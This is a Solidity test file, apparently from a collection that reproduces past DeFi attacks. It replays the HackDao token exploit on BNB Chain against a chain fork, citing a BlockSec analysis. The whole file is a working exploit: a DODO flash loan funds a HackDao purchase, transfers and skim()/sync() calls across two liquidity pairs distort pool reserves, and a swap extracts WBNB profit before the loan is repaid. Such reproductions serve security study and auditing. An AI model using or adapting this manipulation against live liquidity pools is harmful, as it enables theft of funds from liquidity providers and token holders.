// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import {IERC20} from "src/interfaces/IERC20.sol";
import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
import {IDVM} from "src/interfaces/IDVM.sol";
import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
// @Analysis
// https://twitter.com/BlockSecTeam/status/1529084919976034304
// @Contract address
// https://bscscan.com/address/0x94e06c77b02ade8341489ab9a23451f68c13ec1c#code

contract ContractTest is Test {
    IERC20 HackDao = IERC20(0x94e06c77b02Ade8341489Ab9A23451F68c13eC1C);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IUniswapV2Pair Pair1 =
        IUniswapV2Pair(0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2); // HackDao WBNB
    IUniswapV2Pair Pair2 =
        IUniswapV2Pair(0xbdB426A2FC2584c2D43dba5A7aB11763DFAe0225); //HackDao USDT
    IUniswapV2Router Router =
        IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    address dodo = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;

    function setUp() public {
        vm.createSelectFork("bsc", 18_073_756);
    }

    function testExploit() public {
        WBNB.approve(address(Router), type(uint256).max);
        HackDao.approve(address(Router), type(uint256).max);
        IDVM(dodo).flashLoan(1900 * 1e18, 0, address(this), new bytes(1));

        emit log_named_decimal_uint(
            "[End] Attacker WBNB balance after exploit",
            WBNB.balanceOf(address(this)),
            18
        );
    }

    function DPPFlashLoanCall(
        address sender,
        uint256 baseAmount,
        uint256 quoteAmount,
        bytes calldata data
    ) public {
        // get HackDao
        buyHackDao();
        // call skim() to burn HackDao in lp
        HackDao.transfer(address(Pair1), HackDao.balanceOf(address(this)));
        Pair1.skim(address(Pair2));
        Pair1.sync();
        Pair2.skim(address(Pair1));
        // sell HackDao
        (uint256 reserve0, uint256 reserve1, ) = Pair1.getReserves(); // HackDao WBNB
        uint256 amountAfter = HackDao.balanceOf(address(Pair1));
        uint256 amountin = amountAfter - reserve0;
        uint256 amountout = (amountin * 9975 * reserve1) /
            (reserve0 * 10_000 + amountin * 9975);
        Pair1.swap(0, amountout, address(this), "");
        WBNB.transfer(dodo, 1900 * 1e18);
    }

    function buyHackDao() internal {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(HackDao);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}
